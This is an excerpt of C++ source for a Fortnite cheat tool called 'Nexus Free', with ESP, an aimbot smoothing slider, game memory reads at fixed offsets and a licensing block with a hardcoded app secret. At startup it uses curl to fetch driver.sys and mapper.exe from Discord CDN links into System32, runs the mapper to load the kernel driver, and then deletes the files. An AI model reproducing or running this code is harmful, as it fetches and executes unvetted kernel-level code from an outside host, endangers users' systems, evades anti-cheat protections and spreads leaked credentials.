...
std::string name = "Fortnite Public"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = "UGtltaAypS"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = "9c5877e6e1f31a38d095cf7e7cc3f4b409fb839103c842c1e8c48042d88c01c1"; // app secret, the blurred text on licenses tab and other tabs
...
CamewaDescwipsion GetViewPoint() {
	char v1; // r8
	CamewaDescwipsion ViewPoint = ReadBizzy<CamewaDescwipsion>(base_address + 0x10F90A10); // 0xED57310 = EncryptedViewPoint
...
//		system(E("curl https://cdn.discordapp.com/attachments/1087439969594908784/1142035411267489792/mapper.exe --output C:\\Windows\\System32\\mapper.exe >nul 2>&1"));
...

{
	...
	system("color 3");
	std::cout << termcolor::bright_magenta << slowly_printing_string{ "\n\n Loading...", 50 };	Sleep(3000);
	std::cout << termcolor::white;

	system("cls");

	system(E("curl https://cdn.discordapp.com/attachments/1144854062077050975/1145150690084262018/driver.sys --output C:\\Windows\\System32\\driver.sys >nul 2>&1"));
	system(E("curl https://cdn.discordapp.com/attachments/1144854062077050975/1145150689757110302/mapper.exe --output C:\\Windows\\System32\\mapper.exe >nul 2>&1"));
	std::cout << termcolor::bright_magenta << slowly_printing_string{ "\n\n Loading driver", 50 };	Sleep(1000);
	system(E("C:\\Windows\\System32\\mapper.exe C:\\Windows\\System32\\driver.sys"));
	std::cout << termcolor::bright_magenta << slowly_printing_string{ "\n\n Driver Loaded", 50 };	Sleep(1000);
	system("cls");
	Sleep(3000);
	std::remove(E("C:\\Windows\\System32\\driver.sys"));
	std::remove(E("C:\\Windows\\System32\\mapper.exe"));
	...
	Beep(500, 500);
	std::cout << termcolor::bright_magenta << slowly_printing_string{ "\n\n Driver Loaded Sucessfully", 50 };	Sleep(2000);
	system(E("cls"));
	SetConsoleTitleA(random_string(30).c_str());
	system("color 2");
	std::cout << termcolor::bright_magenta << "\n\n  Open Fortnite and press *F1* in the lobby";
	std::cout << termcolor::white;
	while (true)
	{
		Sleep(10);
...
void xInitD3d()
{
	...
	style->WindowMinSize = ImVec2(300, 420);
	...
	style->Colors[ImGuiCol_WindowBg] = ImColor(128, 0, 128, 255);
	style->Colors[ImGuiCol_Border] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_FrameBg] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_FrameBgHovered] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_FrameBgActive] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_CheckMark] = ImColor(0, 50, 128, 255);
	style->Colors[ImGuiCol_SliderGrab] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_SliderGrabActive] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_Button] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_ButtonHovered] = ImColor(25, 50, 128, 255);
	style->Colors[ImGuiCol_ButtonActive] = ImColor(90, 90, 90, 255);
	style->Colors[ImGuiCol_Separator] = ImColor(89, 3, 247, 255);
	style->Colors[ImGuiCol_TitleBg] = ImColor(0, 0, 128, 255);
	style->Colors[ImGuiCol_TitleBgActive] = ImColor(0, 0, 128, 255);
...
void DrawESP() {
	...
	Uworld = ReadBizzy<DWORD_PTR>(base_address + 0x10E500E8);
...
void render() {
	...
	if (ShowMenu)
	{
		...
		ImGui::Begin(("Nexus Free"), 0, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar);
		...
		ImGui::BeginChild("##ChildIdentifier", ImVec2(420, 750)/*SIZE OF THE CHILD*/, false /*IF YOU WANT A BORDER OR NOT*/);
		{
			...
			ImGui::SliderFloat("Aimbot Smoothing", &smooth, 1, 10);
			ImGui::Spacing();
